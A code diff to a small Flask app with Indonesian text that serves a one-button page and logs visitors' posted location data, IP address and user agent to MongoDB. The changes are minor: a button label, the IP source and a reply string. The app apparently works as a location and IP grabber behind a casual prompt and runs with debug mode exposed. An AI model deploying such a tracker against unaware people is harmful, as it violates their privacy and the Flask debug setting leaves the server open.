@@ -21,7 +21,7 @@ def index():
     </head>
     <body>
         <h3>Klik Tombol Dibawah Untuk Melakukan Percobaan</h3>
-        <button onclick="getLocation()">Gasss Abangku   </button>
+        <button onclick="getLocation()">Gasss Abangku</button>
         <p id="status"></p>
 
         <script>
@@ -52,7 +52,7 @@ def index():
 @app.route('/log', methods=['POST'])
 def log_location():
     data = request.get_json()
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    ip = request.remote_addr  # Ambil langsung IP lokal
     ua = request.headers.get('User-Agent')
     t = datetime.datetime.now(datetime.timezone.utc)
 
@@ -68,7 +68,7 @@ def log_location():
     }
 
     log_collection.insert_one(log_entry)
-    return "Berhasil Thanks Bestiee"
+    return "Thankss"
 
 if __name__ == "__main__":
     app.run("0.0.0.0", port=5000, debug=True)
